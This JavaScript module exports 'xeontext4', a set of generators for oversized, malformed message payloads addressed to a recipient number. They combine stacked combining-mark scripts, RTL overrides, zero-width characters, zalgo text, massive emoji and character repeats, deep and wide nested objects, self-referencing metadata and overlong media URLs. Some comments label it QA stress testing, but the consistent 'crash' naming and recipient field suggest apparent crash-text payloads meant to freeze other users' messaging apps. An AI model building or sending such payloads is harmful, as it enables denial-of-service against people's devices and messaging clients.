
const USER_SPECIAL_CHARS = [
  "ລັ້ວ່ັໃ້້ົັໍໝ້້້",           // Lao
  "ျှျှျှျှျှျှ",                // Myanmar
  "ཧྷྐྵྨྭྺྻྜྩྣྡྦྫྷྰྴྵ"     // Tibetan
].join(" ");

const UNICODE_EDGE_CASES = [
  '\u202E',      // RTL override
  '\u200B',      // Zero-width space
  '\uFFFC',      // Object replacement
  '👩‍👩‍👧‍👧',     // ZWJ emoji
  '\u0338',      // Overlays
  '\uFFFDbad\u0000string'
].join(' ');

// Combined unicode block (from your code)
const unicodeBlock = "ລັ້ວ່ັໃ້້ົັໍໝ້້້" + "ျှျBeverly" + "ཧྷྐྵྨྭྺྻྜྩྣྡྦྫྷྰྴྵ";

// Zalgo/combining-marks generator
function zalgo(str, layers = 10) {
  const combining = ['\u0300', '\u0317', '\u0323', '\u035B', '\u0361', '\u0362'];
  let out = str;
  for (let l = 0; l < layers; l++) {
    for (let i = 0; i < combining.length; i++) out += combining[i];
  }
  return out;
}

// Big QA string generator (from your code)
function bigQAString() {
  return Array(2000).fill(unicodeBlock).join("") + "💥".repeat(10000) + "\u202E" + "\u200B".repeat(1000);
}

// Wide object generator
function makeWideObject(width = 3000) {
  let wide = {};
  for (let i = 0; i < width; i++) wide[`w${i}`] = `val${i}`;
  return wide;
}

// Deep nested object
function makeDeepObject(depth = 20) {
  if (depth === 0) return { end: true };
  return { deep: makeDeepObject(depth - 1) };
}

// Crashed-style metadata (overlong, nested, odd types)
function makeCrashedMetadata() {
  return {
    corrupted: true,
    recursive: {},
    unicode: USER_SPECIAL_CHARS + UNICODE_EDGE_CASES,
    longArray: Array(10000).fill(USER_SPECIAL_CHARS),
    overflow: "x".repeat(200000), // 200k chars
    get self() { return this; }
  };
}

// Enhanced crashed metadata with recursive function and fuzz
function makeEnhancedCrashedMetadata() {
  return {
    recurse() { return this; },
    fuzz: Array(5000).fill(null),
    corrupted: true,
    unicode: USER_SPECIAL_CHARS + UNICODE_EDGE_CASES,
    longArray: Array(10000).fill(USER_SPECIAL_CHARS),
    overflow: "x".repeat(200000),
  };
}

// Faked large/broken media URLs
const CRASHED_VIDEO_LINK = "https://example.com/video-" + "A".repeat(3072) + ".mp4";
const CRASHED_IMAGE_LINK = "https://example.com/image-" + "B".repeat(4096) + ".jpg";

// Enhanced media URLs (from your code)
const ENHANCED_CRASHED_VIDEO = "https://example.com/invalid" + "A".repeat(1024) + ".mp4";
const ENHANCED_CRASHED_IMAGE = "https://example.com/img" + "B".repeat(2048) + ".jpg";

// Simple message template
const messageTemplate = {
  to: '',
  message: '',
  metadata: {
    timestamp: Date.now(),
    type: 'crash'
  }
};

// Basic payload generator
const generateCrashPayload = (options = {}) => ({
  ...messageTemplate,
  ...options,
});

// Advanced stress-test payload generator
const generateAdvancedPayload = (options = {}) => {
  const repeatUnicode = options.repeatUnicode || 7000;
  const wideFields = options.wideFields || 3500;
  const deepNesting = options.deepNesting || 22;

  const body = [
    USER_SPECIAL_CHARS,
    UNICODE_EDGE_CASES,
    zalgo("QA!🔥", 18),
    "💥".repeat(3000),
    USER_SPECIAL_CHARS.repeat(100)
  ].join(' | ');

  return {
    to: options.to || '',
    message:
      body + "\n" +
      zalgo(USER_SPECIAL_CHARS, 10) + "\n" +
      "A".repeat(repeatUnicode) + "\n" +
      USER_SPECIAL_CHARS + "\n" +
      UNICODE_EDGE_CASES,
    crashedVideo: CRASHED_VIDEO_LINK,
    crashedImage: CRASHED_IMAGE_LINK,
    crashedMetadata: makeCrashedMetadata(),
    metadata: {
      timestamp: Date.now(),
      type: "qa-test",
      wide: makeWideObject(wideFields),
      deep: makeDeepObject(deepNesting),
      userSpecial: USER_SPECIAL_CHARS
    }
  };
};

// Extreme malformation/fuzzing payload
const advancedMalformedPayload = ({
  to = '',
  depth = 25,
  width = 7000,
  longString = 60000
} = {}) => ({
  to,
  message: `${"A".repeat(longString)}\n${USER_SPECIAL_CHARS}\n${UNICODE_EDGE_CASES}\n`,
  weirdArr: Array.from({length: width}, (_, i) => (i % 2 === 0 ? null : undefined)),
  weirdObj: {
    ...makeWideObject(width),
    bool: true,
    number: 12345.6789,
    func: function() {},
    symbol: Symbol("weird"),
    nested: makeDeepObject(depth),
    subarr: [NaN, Infinity, -Infinity, '', [], {}, /regExp/],
    unionField: [USER_SPECIAL_CHARS, 123, true, undefined, null]
  },
  crashedVideo: CRASHED_VIDEO_LINK,
  crashedImage: CRASHED_IMAGE_LINK,
  crashedMetadata: makeCrashedMetadata(),
  metadata: {
    timestamp: Date.now(),
    type: "qa-malformed",
    note: "For maximum boundary/QA only!",
    unicode: USER_SPECIAL_CHARS
  }
});

// NEW: Enhanced payload with your bigQAString and enhanced metadata (from your code)
const enhancedQAPayload = ({
  to = 'yourOtherNumber'
} = {}) => ({
  to,
  message: bigQAString(),
  crashedVideo: ENHANCED_CRASHED_VIDEO,
  crashedImage: ENHANCED_CRASHED_IMAGE,
  crashedMetadata: makeEnhancedCrashedMetadata(),
  metadata: {
    timestamp: Date.now(),
    type: "qa-enhanced",
    note: "Maximum QA payload with bigQAString integration"
  }
});

// Ultra-extreme payload combining all techniques
const ultraExtremePayload = ({
  to = '',
  depth = 30,
  width = 10000,
  longString = 100000
} = {}) => ({
  to,
  message: bigQAString() + "\n" + `${"A".repeat(longString)}\n${USER_SPECIAL_CHARS}\n${UNICODE_EDGE_CASES}\n`,
  weirdArr: Array.from({length: width}, (_, i) => (i % 3 === 0 ? null : i % 3 === 1 ? undefined : bigQAString())),
  weirdObj: {
    ...makeWideObject(width),
    bool: true,
    number: 12345.6789,
    func: function() {},
    symbol: Symbol("extreme"),
    nested: makeDeepObject(depth),
    subarr: [NaN, Infinity, -Infinity, '', [], {}, /regExp/, bigQAString()],
    unionField: [USER_SPECIAL_CHARS, 123, true, undefined, null, bigQAString()]
  },
  crashedVideo: ENHANCED_CRASHED_VIDEO,
  crashedImage: ENHANCED_CRASHED_IMAGE,
  crashedMetadata: makeEnhancedCrashedMetadata(),
  metadata: {
    timestamp: Date.now(),
    type: "qa-ultra-extreme",
    note: "Ultra-extreme combined payload for maximum QA stress!",
    wide: makeWideObject(width),
    deep: makeDeepObject(depth),
    userSpecial: USER_SPECIAL_CHARS,
    qaString: bigQAString().substring(0, 1000) + "..."
  }
});

const xeontext4 = {
  messageTemplate,
  generateCrashPayload,
  generateAdvancedPayload,
  advancedMalformedPayload,
  enhancedQAPayload,
  ultraExtremePayload,
  bigQAString,
  zalgo,
  makeWideObject,
  makeDeepObject
};

module.exports = { xeontext4 };
